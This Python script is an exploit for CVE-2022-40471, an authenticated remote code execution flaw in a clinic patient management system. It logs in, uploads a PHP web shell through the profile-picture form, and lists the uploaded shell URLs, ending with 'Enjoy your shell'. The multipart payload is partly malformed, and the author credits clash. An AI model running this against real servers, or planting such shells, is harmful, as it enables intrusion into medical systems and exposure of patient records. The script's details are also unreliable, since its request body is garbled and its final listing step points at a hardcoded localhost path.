from bs4 import *
import requests
import sys
import time

class RemoteCodeExecution:
    def auth(target_ip, target_port, uri_path, username, password):
        url = f'http://{target_ip}{uri_path}index.php'
        session = requests.get(url)
        cookies = (f"PHPSESSID={session.cookies['PHPSESSID']}")

        header = {
            'Host': target_ip,
            'Origin': 'http://' + target_ip,
            'Referer': 'http://' + target_ip + uri_path,
            'Cookie': cookies
        }

        data_body = {
            'username': username,
            'password': password,
        }

        url_auth = f'http://{target_ip}:{target_port}{uri_path}index.php'
        authentication = requests.post(url_auth, headers=header, data=data_body)

        if 'false' in authentication.text:
            print('[-] Username or password are incorrect, Try again')
            exit()
        else:
            print("[+] Exploit Title: Remote Code Execution (Authenticated) in Clinic's Patient Management System")
            print("[+] Author: RashidKhan Pathan {iHexCoder}")
            print("[@] Twitter: @itRashid")
            print("")
            time.sleep(1)
            print('[+] Authentication completed successfully,')
            print('[+] Uploading The Webshell')
        
        return cookies

    def exploit(target_ip, target_port, uri_path, cookies):
        header = {
                'Host': target_ip,
                'Content-Type': 'multipart/form-data; boundary=---------------------------405058720612140838201526428067',
                'Content-Length': '777',
                'Origin': 'http://' + target_ip,
                'Connection': 'close',
                'Cookie' : cookies,
                'Referer': 'http://' + target_ip + uri_path + 'users.php',
                'Upgrade-Insecure-Requests': '1'
        }


        data_body = '-----------------------------405058720612140838201526428067\r\nContent-Disposition: form-data; name="display_name\r\n\r\nRCEExploit\r\n-----------------------------405058720612140838201526428067\r\nContent-Disposition: form-data; name="user_name"\r\n\r\nRCEExploit\r\n-----------------------------405058720612140838201526428067\r\nContent-Disposition: form-data; name="password"\r\n\r\nRCEEXPLOIT\r\n-----------------------------405058720612140838201526428067\r\nContent-Disposition: form-data; name="profile_picture"; filename="shell.php"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo shell_exec($_GET["cmd"]); ?>\r\n-----------------------------405058720612140838201526428067\r\nContent-Disposition: form-data; name="save_user"\r\n\r\n-----------------------------405058720612140838201526428067--"; filename="webshell.php"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo shell_exec($_GET["cmd"]); ?>\r\n-----------------------------29635348012019605651675807433\r\nContent-Disposition: form-data; name="change\r\n\r\n-----------------------------29635348012019605651675807433--\r\n'
        uplaod_url = f"http://{target_ip}:{target_port}{uri_path}users.php"
        requests.post(uplaod_url, headers=header, data=data_body)


def main():
    
    if len(sys.argv) != 6:
        time.sleep(1)
        print("[+] Author: David Honisch {b3y0nd3r}")
        print("[@] E-Mail: david@honisch.org")

        time.sleep(1)
        print('Incorrect parameters!\r\n[!] Useage: python3 CVE-2022-40471.py <target_ip> <target_port> <target_uri> <username> <password>')
        print("[!] Example: python3 CVE-2022-40471.py 127.0.0.1 80 /pms/ UserName Password")

        exit()
        
    target_ip = sys.argv[1]
    target_port = sys.argv[2]
    uri_path = sys.argv[3]
    username = sys.argv[4]
    password = sys.argv[5]
    
    
    cookies = RemoteCodeExecution.auth(target_ip, target_port, uri_path, username, password)
    RemoteCodeExecution.exploit(target_ip, target_port, uri_path, cookies)    
    print(f'[+] Webshell uploaded successfully to: http://{target_ip}:{target_port}{uri_path}user_images/')
    print("[+] Enjoy your shell")
    print("[!] Note: In this Exploitation Scenario, Shell Changes the Random Digit after Uploading")
    print("[!] So Can use Any Uploaded Shell with Random Number ")
    print("[!] Copy The One of The Follwing Shell and Exploit it Using Curl ie: http://YourIP/pms/user_images/1663988032shell.php?cmd=whoami")
    print("")
    print("[+] Uploaded Shell")
    def get_url_paths(url, ext='', params={}):
        response = requests.get(url, params=params)
        if response.ok:
            response_text = response.text
        else:
            return response.raise_for_status()
        soup = BeautifulSoup(response_text, 'html.parser')
        parent = [url + node.get('href') for node in soup.find_all('a') if node.get('href').endswith(ext)]
        return parent

    url = 'http://localhost/pms/user_images/'
    ext = 'php'
    result = get_url_paths(url, ext)
    print(result)

   
    
if __name__ == '__main__':
    main()